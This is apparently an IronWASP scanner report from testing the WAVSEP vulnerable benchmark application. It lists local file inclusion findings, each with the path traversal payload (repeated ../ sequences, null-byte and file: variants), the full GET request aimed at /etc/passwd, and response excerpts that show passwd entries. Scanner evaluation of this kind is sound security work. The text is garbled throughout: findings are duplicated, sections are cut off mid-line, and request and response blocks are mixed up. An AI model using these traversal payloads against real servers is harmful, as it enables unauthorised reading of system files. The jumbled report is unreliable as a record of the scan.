sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case21-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=/none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case21-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

This response contains contents of the etc/passwd file. This was caused by the payload

This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp?target=none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd\0

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

[---- Snipped parts of HTTP headers section for brevity ----]

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case18-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultInvalidInput-SlashPathReq-Read.jsp?target=/none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd\0

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case18-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultInvalidInput-SlashPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Request sent by Scanner:

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by using the file: protocol. The payload is /etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case04-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultRelativeInput-AnyPathReq-Read.jsp?target=%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Interesting part of Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

IronWASP is not able to automatically highlight the interesting section of the Response, you would have to identify it manually.
The scanner reported the following text as being of interest in this case:

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp?target=eclipse.ini
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. After that you can try changing the file name to something else and see if the server prints those file contents.

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case17-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-SlashPathReq-Read.jsp?target=/none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd\0

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1

Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case13-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-NoPathReq-Read.jsp?target=
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.

This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case17-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-SlashPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case24-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-BackslashPathReq-Read.jsp?target=/none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd\0

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case24-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

This response contains contents of the etc/passwd file. This was caused by the payload

bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

----- END OF INTERESTING TEXT -----

bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case07-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-AnyPathReq-Read.jsp?target=
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case07-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-AnyPathReq-Read.jsp?target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1

[---- Snipped parts of HTTP headers section for brevity ----]
